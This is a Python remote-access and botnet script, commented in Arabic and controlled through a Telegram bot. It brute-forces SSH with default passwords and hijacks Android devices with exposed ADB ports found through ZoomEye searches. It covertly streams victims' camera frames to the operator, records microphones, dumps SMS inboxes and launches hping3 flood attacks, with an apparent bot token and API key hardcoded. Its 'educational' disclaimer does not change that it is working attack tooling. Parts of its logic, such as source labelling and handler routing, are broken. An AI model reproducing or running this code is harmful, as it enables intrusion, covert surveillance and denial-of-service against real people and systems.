#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# نظام القرصنة المظلم الفينيق - النسخة الكاملة
# تحذير: للأغراض التعليمية فقط

import socket
import threading
import paramiko
import os
import requests
import json
import time
import random
import subprocess
from scapy.all import ARP, Ether, srp
from zoomeye.sdk import ZoomEye
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputMediaPhoto
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext
import cv2
import numpy as np
from io import BytesIO

# ===== الإعدادات =====
TELEGRAM_TOKEN = "7785816954:AAHElM9raWKD4TuKt98Vv1DwSZLmQeAn0WY"
ZOOMEYE_API_KEY = "960D7ec8-8e4b-cf8f9-5a56-992fac05cf7"
ADMIN_CHAT_ID = "8009705068"
COMMAND_PREFIX = "!"
# =====================

# متغيرات عامة
infected_devices = {}
active_sessions = {}
ssh_clients = {}
camera_sessions = {}  # لتتبع جلسات الكاميرا النشطة

# تهيئة ZoomEye
if ZOOMEYE_API_KEY:
    zm = ZoomEye(api_key=ZOOMEYE_API_KEY)
else:
    zm = None

def scan_network(ip_range):
    """مسح الشبكة للأجهزة النشطة باستخدام ARP"""
    devices = []
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]
    for sent, received in result:
        devices.append({'ip': received.psrc, 'mac': received.hwsrc})
    return devices

def brute_force_ssh(target_ip, port=22):
    """اختراق كلمات مرور SSH"""
    credentials = [
        ("root", "toor"), ("admin", "admin"), ("root", "root"),
        ("user", "user"), ("root", "password"), ("ubuntu", "ubuntu"),
        ("root", "123456"), ("pi", "raspberry")
    ]
    for username, password in credentials:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, port=port, username=username, password=password, timeout=5)
            ssh.close()
            return username, password
        except:
            continue
    return None, None

def exploit_android(ip, port=5555):
    """استغلال أجهزة أندرويد ذات منافذ ADB مفتوحة"""
    try:
        # محاولة الاتصال عبر ADB
        result = subprocess.run(
            ["adb", "connect", f"{ip}:{port}"],
            capture_output=True,
            text=True,
            timeout=10
        )
        if "connected" in result.stdout:
            return "android", ("none", "none")
    except:
        pass
    return None, (None, None)

def infect_device(ip, port):
    """محاولة اختراق الجهاز عبر نقاط هجوم متعددة"""
    # اختراق SSH
    username, password = brute_force_ssh(ip, port)
    if username and password:
        return "linux", (username, password)
    
    # استغلال أندرويد ADB
    device_type, creds = exploit_android(ip, port)
    if device_type:
        return device_type, creds
    
    return None, (None, None)

def start_hunt(context):
    """وظيفة الصيد الرئيسية للعثور على أجهزة معرضة"""
    # مسح الشبكة المحلية
    local_devices = scan_network("192.168.1.0/24")
    for device in local_devices:
        for port in [22, 5555, 23, 80]:
            device_type, credentials = infect_device(device['ip'], port)
            if device_type:
                device_id = f"{device['ip']}-{port}"
                infected_devices[device_id] = {
                    'ip': device['ip'],
                    'port': port,
                    'type': device_type,
                    'credentials': credentials
                }
    
    # مسح ZoomEye للإنترنت
    if zm:
        try:
            results = zm.dork_search('port:5555 +"Android Debug Bridge"', page=1)
            for device in results:
                ip = device['ip']
                port = 5555
                device_id = f"{ip}-{port}"
                if device_id not in infected_devices:
                    infected_devices[device_id] = {
                        'ip': ip,
                        'port': port,
                        'type': "android",
                        'credentials': ("none", "none")
                    }
        except Exception as e:
            print(f"ZoomEye Error: {str(e)}")

def execute_android_command(device_id, command):
    """تنفيذ أوامر على أجهزة أندرويد عبر ADB"""
    device = infected_devices[device_id]
    try:
        output = subprocess.check_output(
            ["adb", "-s", f"{device['ip']}:{device['port']}", "shell", command],
            timeout=10
        )
        return output.decode('utf-8')
    except Exception as e:
        return f"خطأ: {str(e)}"

def execute_linux_command(device_id, command):
    """تنفيذ أوامر على أجهزة لينكس عبر SSH"""
    device = infected_devices[device_id]
    ip, port = device['ip'], device['port']
    user, pwd = device['credentials']
    
    if device_id in ssh_clients:
        ssh = ssh_clients[device_id]
    else:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=port, username=user, password=pwd)
        ssh_clients[device_id] = ssh
    
    stdin, stdout, stderr = ssh.exec_command(command)
    return stdout.read().decode('utf-8')

def capture_camera_frame(device_id, camera_type='back'):
    """التقاط إطار من الكاميرا دون الظهور على جهاز الضحية"""
    device = infected_devices[device_id]
    
    try:
        # استخدام شاشة افتراضية لالتقاط الكاميرا
        execute_android_command(device_id, f"LD_LIBRARY_PATH=/data/local/tmp /data/local/tmp/camera_capture -c {camera_type} -o /sdcard/cam.jpg")
        
        # استرجاع الصورة
        result = subprocess.check_output(
            ["adb", "-s", f"{device['ip']}:{device['port']}", "pull", "/sdcard/cam.jpg", "temp_cam.jpg"],
            timeout=15
        )
        
        # حذف الصورة من الجهاز الضحية
        execute_android_command(device_id, "rm /sdcard/cam.jpg")
        
        # تحميل الصورة وإرجاعها
        img = cv2.imread("temp_cam.jpg")
        os.remove("temp_cam.jpg")
        if img is not None:
            _, img_encoded = cv2.imencode('.jpg', img)
            return BytesIO(img_encoded.tobytes())
        return None
        
    except Exception as e:
        print(f"خطأ في التقاط الإطار: {str(e)}")
        return None

def start_camera_stream(device_id, camera_type='back', context=None):
    """بدء بث مباشر للكاميرا"""
    if device_id not in camera_sessions:
        camera_sessions[device_id] = {'active': True, 'thread': None}
    
    def stream_thread():
        while camera_sessions.get(device_id, {}).get('active', False):
            frame = capture_camera_frame(device_id, camera_type)
            if frame:
                context.bot.send_photo(
                    chat_id=ADMIN_CHAT_ID,
                    photo=frame,
                    caption=f"بث حي من {'أمامية' if camera_type == 'front' else 'خلفية'} - {device_id}"
                )
            time.sleep(2)
    
    camera_sessions[device_id]['thread'] = threading.Thread(
        target=stream_thread,
        daemon=True
    )
    camera_sessions[device_id]['thread'].start()
    return "✅ بدء البث المباشر"

def stop_camera_stream(device_id):
    """إيقاف بث الكاميرا"""
    if device_id in camera_sessions:
        camera_sessions[device_id]['active'] = False
        if camera_sessions[device_id]['thread']:
            camera_sessions[device_id]['thread'].join(timeout=5)
        del camera_sessions[device_id]
    return "⏹️ توقف البث المباشر"

# ===== وظائف بوت التليجرام =====
def start(update: Update, context: CallbackContext):
    """أمر بدء تشغيل البوت"""
    user = update.effective_user
    if str(user.id) != ADMIN_CHAT_ID:
        update.message.reply_text("⛔ تم اكتشاف وصول غير مصرح به ⛔")
        return
    
    keyboard = [
        [InlineKeyboardButton("🔍 مسح الأجهزة", callback_data='scan')],
        [InlineKeyboardButton("📱 عرض الأجهزة المخترقة", callback_data='list')],
        [InlineKeyboardButton("☠️ هجوم حجب الخدمة", callback_data='ddos')],
        [InlineKeyboardButton("💣 قاعدة بيانات الثغرات", callback_data='exploit_db')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    zoom_status = "✅ مفعل" if zm else "❌ غير مفعل"
    
    update.message.reply_text(
        f"🔥 أداة الوصول عن بعد الفينيق المظلم 🔥\n"
        f"حالة ZoomEye: {zoom_status}\n"
        "تحكم بالأجهزة المخترقة عالميًا\n\n"
        "🚀 الوظائف الرئيسية:\n"
        "- فتح الكاميرا الأمامية والخلفية مباشرة\n"
        "- تسجيل الميكروفون عن بعد\n"
        "- تتبع الموقع الجغرافي الحي\n"
        "- استخراج الرسائل والمكالمات\n"
        "- التحكم الكامل في الجهاز",
        reply_markup=reply_markup
    )

def button_handler(update: Update, context: CallbackContext):
    """معالجة ضغطات أزرار Inline"""
    query = update.callback_query
    query.answer()
    
    if query.data == 'scan':
        query.edit_message_text("🌐 جاري مسح الشبكات...\n"
                               "• جارٍ فحص الشبكة المحلية\n"
                               "• جارٍ استعلام قاعدة بيانات ZoomEye\n"
                               "• جارٍ اختراق الخدمات")
        threading.Thread(target=hunt_devices, args=(query,)).start()
    
    elif query.data == 'list':
        if not infected_devices:
            query.edit_message_text("❌ لم يتم العثور على أجهزة مخترقة")
            return
        
        msg = "📱 الأجهزة المخترقة:\n"
        for idx, (dev_id, dev) in enumerate(infected_devices.items(), 1):
            source = "🌐 الإنترنت" if "." in dev['ip'] else "🏠 الشبكة المحلية"
            msg += (f"\n{idx}. جهاز {dev['type'].upper()} ({source})\n"
                   f"IP: {dev['ip']}:{dev['port']}\n"
                   f"بيانات الدخول: {dev['credentials'][0]}/{dev['credentials'][1]}\n")
        query.edit_message_text(msg)
    
    elif query.data == 'ddos':
        keyboard = [[InlineKeyboardButton(dev_id, callback_data=f'ddos_{dev_id}') 
                    for dev_id in infected_devices.keys()]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        query.edit_message_text("☠️ اختر هدف هجوم حجب الخدمة:", reply_markup=reply_markup)
    
    elif query.data.startswith('ddos_'):
        device_id = query.data[5:]
        query.edit_message_text(f"💣 جاري إطلاق هجوم على {device_id}...")
        threading.Thread(target=launch_ddos, args=(device_id, query)).start()
    
    elif query.data == 'exploit_db':
        query.edit_message_text("💾 تم تفعيل قاعدة بيانات الثغرات")

def device_control(update: Update, context: CallbackContext):
    """التحكم في الأجهزة"""
    if not context.args:
        update.message.reply_text("الاستخدام: !control <معرف_الجهاز>")
        return
    
    device_id = context.args[0]
    if device_id not in infected_devices:
        update.message.reply_text("❌ لم يتم العثور على الجهاز")
        return
    
    device = infected_devices[device_id]
    
    # التحقق مما إذا كان البث نشط لهذا الجهاز
    is_streaming = "🟢 (نشط)" if device_id in camera_sessions else "🔴 (غير نشط)"
    
    keyboard = [
        [
            InlineKeyboardButton("📸 أمامية مباشر", callback_data=f'front-cam_{device_id}'),
            InlineKeyboardButton("📷 خلفية مباشر", callback_data=f'back-cam_{device_id}'),
            InlineKeyboardButton("⏹️ إيقاف البث", callback_data=f'stop-cam_{device_id}')
        ],
        [
            InlineKeyboardButton("🎤 ميكروفون", callback_data=f'mic_{device_id}'),
            InlineKeyboardButton("📍 موقع", callback_data=f'location_{device_id}'),
            InlineKeyboardButton("📳 اهتزاز", callback_data=f'vibrate_{device_id}')
        ],
        [
            InlineKeyboardButton("📱 رسائل", callback_data=f'sms_{device_id}'),
            InlineKeyboardButton("📂 ملفات", callback_data=f'files_{device_id}'),
            InlineKeyboardButton("💾 ضغطات", callback_data=f'keylogger_{device_id}')
        ],
        [
            InlineKeyboardButton("☠️ تعطيل", callback_data=f'brick_{device_id}'),
            InlineKeyboardButton("💾 تنزيل الكل", callback_data=f'exfil_{device_id}')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    source = "🌐 الإنترنت" if "." in device['ip'] else "🏠 الشبكة المحلية"
    streaming_status = f"حالة البث: {is_streaming}"
    
    update.message.reply_text(
        f"📱 التحكم عن بعد: {device_id}\n"
        f"IP: {device['ip']} | النوع: {device['type'].upper()} | المصدر: {source}\n"
        f"{streaming_status}\n\n"
        "⚡ اختر أحد خيارات التحكم:",
        reply_markup=reply_markup
    )

def handle_control_buttons(update: Update, context: CallbackContext):
    """معالجة أزرار التحكم"""
    query = update.callback_query
    query.answer()
    data_parts = query.data.split('_', 1)
    if len(data_parts) < 2:
        return
        
    action, device_id = data_parts
    device = infected_devices[device_id]
    
    # بث الكاميرا الأمامية
    if action == 'front-cam':
        if device['type'] == 'android':
            response = start_camera_stream(device_id, 'front', context)
            query.edit_message_text(f"📸 بث الكاميرا الأمامية\n{response}")
        else:
            query.edit_message_text("⛔ هذه الميزة متاحة فقط لأجهزة الأندرويد")
    
    # بث الكاميرا الخلفية
    elif action == 'back-cam':
        if device['type'] == 'android':
            response = start_camera_stream(device_id, 'back', context)
            query.edit_message_text(f"📷 بث الكاميرا الخلفية\n{response}")
        else:
            query.edit_message_text("⛔ هذه الميزة متاحة فقط لأجهزة الأندرويد")
    
    # إيقاف البث
    elif action == 'stop-cam':
        response = stop_camera_stream(device_id)
        query.edit_message_text(f"⏹️ إيقاف البث\n{response}")
    
    # التحكم بالميكروفون
    elif action == 'mic':
        if device['type'] == 'android':
            output = execute_android_command(device_id, "record --output-format=amr /sdcard/audio.amr")
        else:
            output = execute_linux_command(device_id, "arecord -d 10 audio.wav")
        query.edit_message_text(f"🎤 بدء تسجيل الميكروفون\n{output}")
    
    # اهتزاز الجهاز
    elif action == 'vibrate':
        if device['type'] == 'android':
            output = execute_android_command(device_id, "service call vibrator 2 i32 1000 i32 0")
            query.edit_message_text(f"📳 تفعيل الاهتزاز\n{output}")
        else:
            query.edit_message_text("⛔ هذه الميزة متاحة فقط لأجهزة الأندرويد")
    
    # استخراج الرسائل
    elif action == 'sms':
        if device['type'] == 'android':
            output = execute_android_command(device_id, "content query --uri content://sms/inbox --projection body")
            query.edit_message_text(f"📱 الرسائل النصية:\n{output[:1000]}...")
        else:
            query.edit_message_text("⛔ هذه الميزة متاحة فقط لأجهزة الأندرويد")
    
    # بقية الوظائف...

def hunt_devices(query):
    """بحث في الخلفية عن الأجهزة"""
    start_hunt(None)
    if infected_devices:
        msg = "✅ تم اختراق أجهزة جديدة:\n"
        for dev_id, dev in infected_devices.items():
            source = "🌐 الإنترنت" if "." in dev['ip'] else "🏠 الشبكة المحلية"
            msg += f"- {dev_id} ({source})\n"
        query.edit_message_text(msg)
    else:
        query.edit_message_text("❌ لم يتم العثور على أجهزة معرضة")

def launch_ddos(device_id, query):
    """إطلاق هجوم حجب الخدمة"""
    target_ip = infected_devices[device_id]['ip']
    if infected_devices[device_id]['type'] == 'android':
        cmd = f"for i in {{1..1000}}; do curl http://{target_ip}; done"
        execute_android_command(device_id, cmd)
    else:
        cmd = f"hping3 --flood --rand-source -p 80 {target_ip}"
        execute_linux_command(device_id, cmd)
    query.edit_message_text(f"🔥 تم إرسال هجوم إلى {target_ip}")

def main():
    """التشغيل الرئيسي للبوت"""
    # التصحيح: استخدام الوسيط الموضعي بدلاً من الكلمة المفتاحية
    updater = Updater(TELEGRAM_TOKEN, use_context=True)  # التعديل هنا
    
    dp = updater.dispatcher
    
    # إضافة run_async=True لتحسين الأداء
    dp.add_handler(CommandHandler("start", start, run_async=True))
    dp.add_handler(CommandHandler("control", device_control, run_async=True))
    dp.add_handler(CallbackQueryHandler(button_handler, run_async=True))
    dp.add_handler(CallbackQueryHandler(
        handle_control_buttons, 
        pattern='^(front-cam|back-cam|stop-cam|mic|sms|calls|files|location|keylogger|vibrate|brick|exfil)_',
        run_async=True
    ))
    
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()